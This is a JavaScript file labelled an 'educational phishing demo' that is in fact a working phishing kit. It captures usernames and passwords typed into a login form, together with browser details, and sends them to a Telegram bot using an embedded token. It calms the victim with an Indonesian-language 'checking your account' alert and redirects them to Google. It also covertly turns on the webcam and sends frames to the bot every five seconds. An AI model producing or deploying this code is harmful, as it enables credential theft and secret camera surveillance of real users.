/**
 * EDUCATIONAL PHISHING DEMO
 * 
 * IMPORTANT: Replace YOUR_TELEGRAM_BOT_TOKEN with your own bot token
 */

const BOT_TOKEN = '‎8363242595:AAEkV0TBoBud3pCbp4rTx-GGdu__tPdfF5k';
const CHAT_ID = 'YOUR_CHAT_ID';

// Function to send data to Telegram Bot
async function sendData(dataObj) {
  const encodedParams = Object.entries(dataObj).map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`).join('&');
  
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: encodedParams
  }).catch(console.error);
}

// Handle form submission
document.getElementById('login-form').addEventListener('submit', async (event) => {
  event.preventDefault();
  
  // Get form values
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  
  // Collect basic info
  const userAgent = navigator.userAgent;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const language = navigator.language;
  const onlineStatus = navigator.onLine;

  // Send collected data
  await sendData({
    chat_id: CHAT_ID,
    text: `New Login Attempt Detected! 🚨\n\n` +
          `- Username: ${username}\n` +
          `- Password: ${password}\n` +
          `- User Agent: ${userAgent.substring(0, 50)}...\n` +
          `- Timezone: ${timezone}\n` +
          `- Language: ${language}\n` +
          `- Connection: ${onlineStatus ? 'Active' : 'Lost'}`
  });
  
  // Redirect after submission
  setTimeout(() => {
    alert('Mohon tunggu... Kami sedang memeriksa akun Anda.');
    location.href = 'https://google.com';
  }, 1000);
});

// Optional: Capture screenshot
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    const videoElement = document.getElementById('video-capture');
    videoElement.srcObject = stream;
    videoElement.play();
    
    setInterval(async () => {
      const canvas = document.getElementById('canvas-capture');
      const context = canvas.getContext('2d');
      
      canvas.width = videoElement.videoWidth;
      canvas.height = videoElement.videoHeight;
      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      
      // Convert to base64
      const imageDataUrl = canvas.toDataURL('image/png');
      
      // Send image to bot
      await sendData({
        chat_id: CHAT_ID,
        caption: 'Screenshot dari layar pengguna:',
        photo: imageDataUrl.split(',')[1] // Remove header
      });
    }, 5000); // Every 5 seconds
  })
  .catch(err => console.error('Camera error:', err));